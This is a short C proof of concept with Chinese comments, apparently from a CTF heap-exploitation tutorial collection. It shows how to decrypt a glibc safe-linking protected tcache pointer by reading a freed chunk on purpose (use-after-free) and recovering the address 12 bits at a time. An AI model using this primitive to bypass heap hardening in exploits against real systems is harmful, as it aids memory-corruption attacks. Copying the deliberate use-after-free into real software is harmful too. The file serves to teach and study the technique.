/*
 * 中文导读（CTF 版）
 *
 * 手法：safe_linking
 * 文件标注范围：decrypt ~ 2.32 ~ 2.43
 * 模拟漏洞：泄露一个受保护单链指针，或能让同一指针经历两次 PROTECT_PTR。
 * 核心流程：解密 PoC 逐 12 位恢复地址；double-protect PoC 利用 xor 自反性把已知目标重新变成可用链指针。
 * 成功判据：恢复出的地址/最终分配地址与真实值相等。它是 2.32+ tcache/fastbin 攻击的配套原语。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	/*
	 * safe-linking 密文满足 cipher = plain ^ (storage >> 12)。最低 12 位不受
	 * key 影响，而指针高位又与其 ASLR 页号相关，因此可以从最高位开始，每轮
	 * 恢复 12 位 plain，再用已恢复部分更新 key；迭代数轮即可还原完整指针。
	 *
	 * 本例选择 storage 与 plain 位于同一页，页差为 0，关系最直观。若二者
	 * 不同页，只要已知相对页偏移，也能在每轮计算中加入该偏移继续恢复。
	 * 更一般的推导与样例：
	 * https://github.com/n132/Dec-Safe-Linking
	 */

	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	// 第一步：申请 a、b 两个同尺寸块，并用保护块阻止它们与 top 合并。
	long *a = malloc(0x20);
	long *b = malloc(0x20);

	malloc(0x10);

	// 第二步：先释放 a 再释放 b，使 b->next 保存指向 a 的 safe-linking 密文。
	free(a);
	free(b);

	// 第三步：把泄漏出的 b[0] 当作 safe-linking 密文。
	long cipher = b[0];
	long key = 0;
	long plaintext = 0;

	// 从地址最高位开始，每轮恢复 12 位明文，再用它更新下一轮的页号 key。
	for(int i = 1; i < 6; i++) {
		int bits = 64 - 12 * i;
		if(bits < 0)
			bits = 0;

		plaintext = ((cipher ^ key) >> bits) << bits;
		key = plaintext >> 12;
	}

	assert(plaintext == (long)a);
}
